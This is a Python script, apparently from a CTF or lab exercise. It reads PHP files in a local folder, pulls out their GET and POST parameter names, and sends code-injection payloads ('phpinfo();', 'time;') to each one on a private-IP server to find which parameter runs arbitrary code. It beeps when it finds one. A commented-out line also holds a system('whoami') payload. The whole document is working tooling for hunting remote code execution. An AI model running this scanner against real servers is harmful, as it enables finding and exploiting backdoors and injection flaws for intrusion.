import os
import re
import requests
import winsound

duration = 1000  # millisecond
freq = 440  # Hz

filePath = './src/kitty/'
files = os.listdir(filePath)
url = "http://192.168.1.140/new/src/"

# url = "http://localhost/"
def get_rep(filename, name):
    r_url = url + filename +  "?" + name + "=time;"
    rep = requests.get(r_url)
    #print(r_url)
    if '当前时间' in rep.content.decode('gbk'):
        print("Got It!   !!!!!!! " + filename + " The param is: _GET[\'" + name +"\']")
        winsound.Beep(freq, duration)

    r_url = url + filename +  "?" + name + "=phpinfo();"
    #print(r_url)
    rep = requests.get(r_url)
    if 'PHP Version 5.4.45' in rep.content.decode('gbk'):
    	print("Got It!   !!!!!!! " + filename + " The param is: _GET[\'" + name +"\']")
    	winsound.Beep(freq, duration)


def post_rep(filename, name):
    r_url = url + filename
    param = {
        name: "time;"
    }
    rep = requests.post(r_url, data=param)
    #print(r_url + " POST: " + name)
    if '当前时间' in rep.content.decode('gbk'):
        print("Got It!   !!!!!!! " + filename + " The param is: _POST[\'" + name +"\']")
        winsound.Beep(freq, duration)
    param = {
        name: "phpinfo();"
    }
    rep = requests.post(r_url, data=param)
    #print(r_url + " POST: " + name)
    if 'PHP Version 5.4.45' in rep.content.decode('gbk'):
        print("Got It!   !!!!!!! " + filename + " The param is: _POST[\'" + name +"\']")
        winsound.Beep(freq, duration)
    

# print(files)
for k in files:
    if k == '.DS_Store':
        continue
    if k == 'index.html':
        continue
    # print(k)
    with open('./src/kitty/' + k, 'rt') as f:
        print(k)
        
        content = f.read()
        get = re.findall(r"GET\['(.+?)'\]", content)
        post = re.findall(r"POST\['(.+?)'\]", content)
        for i in get:
            get_rep(k, i)
            print(i)
        for i in post:
            print(i)
         #   post_rep(k, i)
        # url_get = ''
        # for tmp in get:
        #     # url_get += tmp+"=system('whoami')&"
        #     url_get += tmp+"=  &"
        # return url_get[:-1]
        f.close()
#post_rep("kitty.php","assert1")
